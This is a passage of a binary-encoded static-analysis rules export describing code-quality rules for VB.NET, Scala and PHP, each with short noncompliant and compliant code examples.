vbnetS41441Methods should not have identical implementations"MAJOR*vbnet:”<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Private Const CODE As String = "bounteous"
Private callCount As Integer = 0

Public Function GetCode() As String
  callCount = callCount + 1
  Return CODE
End Function

Public Function GetName() As String ' Noncompliant
  callCount = callCount + 1
  Return CODE
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Private Const CODE As String = "bounteous"
Private callCount As Integer = 0

Public Function GetCode() As String
  callCount = callCount + 1
  Return CODE
End Function

Public Function GetName() As String
  Return GetCode()
End Function
</pre>
<h2>Exceptions</h2>
<p>Empty methods, methods with only one line of code and methods with the same name (overload) are ignored.</p>Z
CODE_SMELL
ô
vbnet:S4428â
vbnetS4428C"PartCreationPolicyAttribute" should be used with "ExportAttribute""MAJOR*vbnet:†<p>The <code>PartCreationPolicyAttribute</code> attribute, which is part of the Managed Extensibility Framework (MEF), is used to specify how the
exported object will be created. Therefore it doesn't make sense not to export this a class with this attribute using the <code>ExportAttribute</code>
attribute.</p>
<p>This rule raises an issue when a class is marked as shared with a <code>PartCreationPolicyAttribute</code> but lacks a
<code>ExportAttribute</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;PartCreationPolicy(CreationPolicy.Any)&gt; ' Noncompliant
Public Class FooBar
    Inherits IFooBar
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.Any)&gt;
Public Class FooBar
    Inherits IFooBar
End Class
</pre>ZBUG
˘
vbnet:S1151È
vbnetS1151>"Select...Case" clauses should not have too many lines of code"MAJOR*vbnet:˛<p>The <code>Select...Case</code> statement should be used only to clearly define some new branches in the control flow. As soon as a case clause
contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the case clause
should be extracted into a dedicated procedure.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
Select Case number
    Case 1 To 5 ' Noncompliant: 4 statements in the case
        MethodCall1("")
        MethodCall2("")
        MethodCall3("")
        MethodCall4("")
    Case Else
        ' ...
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
Select Case number
    Case 1 To 5
        DoSomething()
    Case Else
        ' ...
End Select
...
Sub DoSomething()
    MethodCall1("")
    MethodCall2("")
    MethodCall3("")
    MethodCall4("")
End Sub
</pre>Z
CODE_SMELL
Ó
vbnet:S4143ﬁ
vbnetS41431Map values should not be replaced unconditionally"MAJOR*vbnet:á<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
towns.Item(x) = "London"
towns.Item(x) = "Chicago";  // Noncompliant
</pre>ZBUG
º
vbnet:S4142¨
vbnetS41422Duplicate values should not be passed as arguments"MAJOR*vbnet:Õ<p>There are valid cases for passing a variable multiple times into the same method call, but usually doing so is a mistake, and something else was
intended for one of the arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If compare(myPoint.x, myPoint.x) &lt;&gt; 0 Then ' Noncompliant
    '...
End If

If compare(getNextValue(), getNextValue()) &lt;&gt; 0 Then ' Noncompliant
    '...
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If compare(myPoint.x, myPoint.y) &lt;&gt; 0 Then
    '...
End If

Dim v1 As Integer = getNextValue()
Dim v2 As Integer = getNextValue()
If compare(v1, v2) &lt;&gt; 0 Then
    '...
End If
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
Ã

vbnet:S4260º

vbnetS4260="ConstructorArgument" parameters should exist in constructors"MAJOR*vbnet:Ÿ	<p>When creating a custom Markup Extension that accepts parameters in WPF, the <code>ConstructorArgument</code> markup must be used to identify the
discrete properties that match these parameters. However since this is done via a string, the compiler will not notice if there are typos.</p>
<p>This rule raises an issue when the string argument to <code>ConstructorArgumentAttribute</code> doesn't match any parameter of any constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Imports System

Namespace myLibrary
    Public Class MyExtension
        Inherits MarkupExtension

        Public Sub New()
        End Sub

        Public Sub New(ByVal value1 As Object)
            Value1 = value1
        End Sub

        &lt;ConstructorArgument("value2")&gt; ' Noncompliant
        Public Property Value1 As Object
    End Class
End Namespace
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports System

Namespace MyLibrary
    Public Class MyExtension
        Inherits MarkupExtension

        Public Sub New()
        End Sub

        Public Sub New(ByVal value1 As Object)
            Value1 = value1
        End Sub

        &lt;ConstructorArgument("value1")&gt;
        Public Property Value1 As Object
    End Class
End Namespace
</pre>ZBUG
·
vbnet:S3466—
vbnetS34664Optional parameters should be passed to "base" calls"MAJOR*vbnet:˜<p>Generally, writing the least code that will <em>readably</em> do the job is a good thing, so omitting default parameter values seems to make sense.
Unfortunately, when you omit them from the <code>base</code> call in an override, you're not actually getting the job done thoroughly, because you're
ignoring the value the caller passed in. The result will likely not be what the caller expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class BaseClass
    Public Overridable Sub MyMethod(ByVal Optional i As Integer = 1)
        Console.WriteLine(i)
    End Sub
End Class

Public Class DerivedClass
    Inherits BaseClass

    Public Overrides Sub MyMethod(ByVal Optional i As Integer = 1)
        ' ...
        MyBase.MyMethod() ' Noncompliant; caller's value is ignored
    End Sub

    Private Shared Function Main(ByVal args As String()) As Integer
        Dim dc As DerivedClass = New DerivedClass()
        dc.MyMethod(12) ' prints 1
    End Function
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class BaseClass
    Public Overridable Sub MyMethod(ByVal Optional i As Integer = 1)
        Console.WriteLine(i)
    End Sub
End Class

Public Class DerivedClass
    Inherits BaseClass

    Public Overrides Sub MyMethod(ByVal Optional i As Integer = 1)
        ' ...
        MyBase.MyMethod(i)
    End Sub

    Private Shared Function Main(ByVal args As String()) As Integer
        Dim dc As DerivedClass = New DerivedClass()
        dc.MyMethod(12) ' prints 12
    End Function
End Class

</pre>ZBUG
£
vbnet:S2376ì
vbnetS2376(Write-only properties should not be used"MAJOR*vbnet:æ<p>Properties with only setters are confusing and counterintuitive. Instead, a property getter should be added if possible, or the property should be
replaced with a setter method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    WriteOnly Property Foo() As Integer ' Non-Compliant
        Set(ByVal value As Integer)
            ' ... some code ...
        End Set
    End Property
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub SetFoo(ByVal value As Integer)  ' Compliant
        ' ... some code ...
    End Sub
End Module
</pre>Z
CODE_SMELL
∑
vbnet:S3981ß
vbnetS3981?Collection sizes and array length comparisons should make sense"MAJOR*vbnet:¬<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or
equal to zero doesn't make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return
<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
If Collection.Count &gt;= 0 Then ...

If Enumerable.Count &lt; 0 Then ...

If array.Length &gt;= 0 Then ...

Dim result As Boolean = Array.Length &gt;= 0
</pre>
<h2>Compliant Solution</h2>
<pre>
If list.Count = 0 Then ...
If array.Length &gt;= 42 Then ...
</pre>ZBUG
ﬁ
vbnet:S3903Œ
vbnetS3903+Types should be defined in named namespaces"MAJOR*vbnet:˝<p>Types are declared in namespaces in order to prevent name collisions and as a way to organize them into the object hierarchy. Types that are
defined outside any named namespace are in a global namespace that cannot be referenced in code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class Foo
End Class

Public Structure Bar
End Structure
</pre>
<h2>Compliant Solution</h2>
<pre>
Namespace SomeSpace
    Public Class Foo
    End Class

    Public Structure Bar
    End Structure
End Namespace
</pre>ZBUG
∏
vbnet:S2372®
vbnetS23725Exceptions should not be thrown from property getters"MAJOR*vbnet:∆<p>Property getters should be simple operations that are always safe to call. If exceptions need to be thrown, it is best to convert the property to a
method. </p>
<p>It is valid to throw exceptions from indexed property getters and from property setters, which are not detected by this rule.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Public Property Foo() As Integer
        Get
            Throw New Exception  ' Non-Compliant
        End Get
        Set(ByVal value As Integer)
            ' ... some code ...
        End Set
    End Property
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub SetFoo(ByVal value As Integer)         ' Compliant
        ' ... some code ...
    End Sub
End Module
</pre>
<h2>Exceptions</h2>
<p>No issue is raised when the thrown exception derives from or is of type <code>NotImplementedException</code>, <code>NotSupportedException</code> or
<code>InvalidOperationException</code>.</p>Z
CODE_SMELL
ã

vbnet:S138¸
vbnetS1381Procedures should not have too many lines of code"MAJOR*vbnet:ü<p>A procedure that grows too large tends to aggregate too many responsibilities.</p>
<p>Such procedures inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller procedures which focus on well-defined tasks.</p>
<p>Those smaller procedures will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
µ
common-scala:FailedUnitTestsî
common-scalaFailedUnitTests!Failed unit tests should be fixed"MAJOR*scala:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
í
common-scala:SkippedUnitTests
common-scalaSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*scala:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
ˆ
common-scala:DuplicatedBlocks‘
common-scalaDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*scala:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
†
'common-scala:InsufficientCommentDensityÙ
common-scalaInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*scala:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
‡
%common-scala:InsufficientLineCoverage∂
common-scalaInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*scala:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Ï
'common-scala:InsufficientBranchCoverage¿
common-scalaInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*scala:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
•
scala:S1134ï
scalaS1134Track uses of "FIXME" tags"MAJOR*scala:Œ<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var result = numerator / denominator  // FIXME denominator value might be  0
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
ƒ
scala:S1871¥
scalaS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*scala:∞<p>Having two <code>cases</code> in a <code>match</code> statement or two branches in an <code>if</code> chain with the same implementation is at best
duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should be
combined, or for a <code>match</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
value match {
  case 1 =&gt;
    doFirstThing
    doSomething
  case 2 =&gt;
    doSomethingDifferent
  case 3 =&gt; // Noncompliant; duplicates case 1's implementation
    doFirstThing
    doSomething
  case _ =&gt;
    doTheRest
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing
  doTheThing
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing
  doTheThing  // Noncompliant; duplicates first condition
}
else {
  doTheRest
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>match</code> statement that contain a
single line of code.</p>
<pre>
if(a == 1) {
  doSomething  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse
} else {
  doSomething
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>match</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>match</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=scala%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if(a == 1) {
  doSomething  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething
}
</pre>Z
CODE_SMELL
È
scala:S4144Ÿ
scalaS41441Methods should not have identical implementations"MAJOR*scala:˚<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Box(length: Int, width: Int, height: Int) {
  def volume: Int = {
    val s = length * width
    s * height
  }

  def area: Int = {
    val s = length * width
    s * height
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Box(length: Int, width: Int, height: Int) {
  def volume: Int = {
    val s = length * width
    s * height
  }

  def area: Int = {
    length * width
  }
}
</pre>
<h2>Exceptions</h2>
<p>Methods with fewer than 2 statements are ignored.</p>Z
CODE_SMELL
æ
scala:ParsingErrorß
scalaParsingErrorScala parser failure"MAJOR*scala:ﬂ<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
ﬁ
scala:S1656Œ
scalaS1656%Variables should not be self-assigned"MAJOR*scala:É<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def doSomething() = {
    var name = ""
    // ...
    name = name
}
</pre>
<h2>Compliant Solution</h2>
<pre>
def doSomething() = {
    var name = ""
    // ...
    this.name = name
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
Œ
scala:S1479æ
scalaS1479;"match" expressions should not have too many "case" clauses"MAJOR*scala:÷<p>When <code>match</code> expressions have a large number of clauses, it is usually an attempt to map two sets of data. A real map structure would be
more readable and maintainable, and should be used instead.</p>Z
CODE_SMELL
 

scala:S103ª
scalaS103Lines should not be too long"MAJOR*scala:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
∏

scala:S125©
scalaS125,Sections of code should not be commented out"MAJOR*scala:—<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be "commented out". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out" </li>
</ul>Z
CODE_SMELL
·
scala:S1151—
scalaS1151;"match case" clauses should not have too many lines of code"MAJOR*scala:È<p>The <code>match</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code> clause
contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 5:</p>
<pre>
myVariable match {
  case 0 =&gt; // Noncompliant: 6 lines till next case
    methodCall1()
    methodCall2()
    methodCall3()
    methodCall4()
    methodCall5()
  case 1 =&gt;
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myVariable match {
  case 0 =&gt; doSomething()
  case 1 =&gt;
  // ...
}
// ...
def doSomething(): Unit = {
  methodCall1()
  methodCall2()
  methodCall3()
  methodCall4()
  methodCall5()
}
</pre>Z
CODE_SMELL
·
scala:S1172—
scalaS1172,Unused function parameters should be removed"MAJOR*scala:¯<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
‡

scala:S104—
scalaS104,Files should not have too many lines of code"MAJOR*scala:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
á

scala:S107¯
scalaS107-Functions should not have too many parameters"MAJOR*scala:ü<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>Z
CODE_SMELL
œ

scala:S108¿
scalaS108.Nested blocks of code should not be left empty"MAJOR*scala:Ê<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (i &lt; 10) {}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>Z
CODE_SMELL
•
scala:S1764ï
scalaS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*scala:§<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=scala%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
ã

scala:S1763˚	
scalaS17633Jump statements should not be followed by dead code"MAJOR*scala:¢	<p>Jump statements (<code>return</code>) move control flow out of the current code block. So any statements that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(a: Int) {
  val i = 10;
  return a + i;       // Noncompliant
  bar;                // dead code
}
</pre>
<h2>Compliant Solution</h2>
<pre>
def foo(a: Int): Int {
  val i = 10;
  return a + i;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
ë
scala:S1862Å
scalaS1862\Related "if"/"else if" statements and "case" in a "match" should not have the same condition"MAJOR*scala:ˇ<p>A <code>match</code> and a chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will
be executed: the first one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>For a <code>match</code>, the second <code>case</code> will never be executed, rendering it dead code. Worse there is the risk in this situation
that future maintenance will be done on the dead case, rather than on the one that's actually used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1) {
  openWindow
} else if (param == 2) {
  closeWindow
} else if (param == 1) { // Noncompliant
  moveWindowToTheBackground
}

param match {
  case 1 =&gt;
  // ...
  case 3 =&gt;
  // ...
  case 1 =&gt; // Noncompliant
  // ...
  case _ =&gt;
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1) {
  openWindow
} else if (param == 2) {
  closeWindow
} else if (param == 3) {
  moveWindowToTheBackground
}

param match {
  case 1 =&gt;
  // ...
  case 3 =&gt;
  // ...
  case _ =&gt;
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
‰
scala:S1145‘
scalaS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*scala:Ë
<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  if (true) {
    doSomething
  }
  // ...
  if (false) {
    doSomethingElse
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  doSomething
  // ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>ZBUG
É
scala:S1144Û
scalaS1144*Unused "private" methods should be removed"MAJOR*scala:ú<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>Z
CODE_SMELL
˝
scala:S1066Ì
scalaS1066,Collapsible "if" statements should be merged"MAJOR*scala:î<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (file != null) {
  if (file.isFile || file.isDirectory) {
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (file != null &amp;&amp; isFileOrDirectory(file)) {
  /* ... */
}

def isFileOrDirectory(file: File): Boolean = file.isFile || file.isDirectory
</pre>Z
CODE_SMELL
‘

scala:S122≈
scalaS122&Statements should be on separate lines"MAJOR*scala:Û<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
println("Hello"); println("world!")
</pre>
<h2>Compliant Solution</h2>
<pre>
println("Hello")
println("world!")
</pre>Z
CODE_SMELL
ó
scala:S3923á
scalaS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*scala:ä<p>Having all branches in a <code>match</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>match</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) { // Noncompliant
  doSomething
} else {
  doSomething
}

i match { // Noncompliant
  case 1 =&gt; doSomething
  case 2 =&gt; doSomething
  case 3 =&gt; doSomething
  case _ =&gt; doSomething
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>match</code>-es without <code>case _</code>
alternatives.</p>
<pre>
if (b == 0) {
  doSomething
} else if (b == 1) {
  doSomething
}
</pre>ZBUG
Ì

scala:S138ﬁ
scalaS138.Methods should not have too many lines of code"MAJOR*scala:Ñ<p>A method that grows too large tends to aggregate too many responsibilities. Such method inevitably become harder to understand and therefore harder
to maintain.</p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller methods which focus on well-defined tasks. Those smaller methods will
not only be easier to understand, but also probably easier to test.</p>Z
CODE_SMELL
ˆ
common-vbnet:DuplicatedBlocks‘
common-vbnetDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*vbnet:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
µ
common-vbnet:FailedUnitTestsî
common-vbnetFailedUnitTests!Failed unit tests should be fixed"MAJOR*vbnet:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
í
common-vbnet:SkippedUnitTests
common-vbnetSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*vbnet:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
†
'common-vbnet:InsufficientCommentDensityÙ
common-vbnetInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*vbnet:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
‡
%common-vbnet:InsufficientLineCoverage∂
common-vbnetInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*vbnet:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Ï
'common-vbnet:InsufficientBranchCoverage¿
common-vbnetInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*vbnet:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
ÿ
	php:S1134 
phpS1134Track uses of "FIXME" tags"MAJOR*php:á<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function divide($numerator, $denominator) {
  return $numerator / $denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
ì
php:S112Ü
phpS112VGeneric exceptions ErrorException, RuntimeException and Exception should not be thrown"MAJOR*php:à<p>If you throw a general exception type, such as ErrorException, RuntimeException, or Exception in a library or framework, it forces consumers to
catch all exceptions, including unknown exceptions that they do not know how to handle.</p>
<p>Instead, either throw a subtype that already exists in the Standard PHP Library, or create your own type that derives from Exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
throw new Exception();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
throw new InvalidArgumentException();
// or
throw new UnexpectedValueException();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/397.html">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BoB3AQ">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>Z
CODE_SMELL
Ã
	php:S1536æ
phpS1536(Function argument names should be unique"MAJOR*php:Ù<p>Function arguments should all have different names to prevent any ambiguity. Indeed, if arguments have the same name, the last duplicated argument
hides all the previous arguments with the same name. This hiding makes no sense, reduces understandability and maintainability, and obviously can be
error prone. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function compute($a, $a, $c) { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function compute($a, $b, $c) { // Compliant
}
</pre>ZBUG
æ
	php:S1656∞
phpS1656%Variables should not be self-assigned"MAJOR*php:È<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public function setName($name) {
    $name = $name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function setName($name) {
    $this-&gt;name = $name;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
◊
php:S905 
phpS905PNon-empty statements should change control flow or have at least one side-effect"MAJOR*php:Ÿ<p>Any statement (other than a null statement, which means a statement containing only a semicolon <code>;</code>) which has no side effect and does
not result in a change of control flow will normally indicate a programming error, and therefore should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$a == 1; // Noncompliant; was assignment intended?
$a &lt; $b; // Noncompliant; have we forgotten to assign the result to a variable?
{code}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/482">MITRE, CWE-482</a> - Comparing instead of Assigning </li>
</ul>ZBUG
 
php:S907Ω
phpS907#"goto" statement should not be used"MAJOR*php:Ú<p><code>goto</code> is an unstructured control flow statement. It makes code less readable and maintainable. Structured control flow statements such
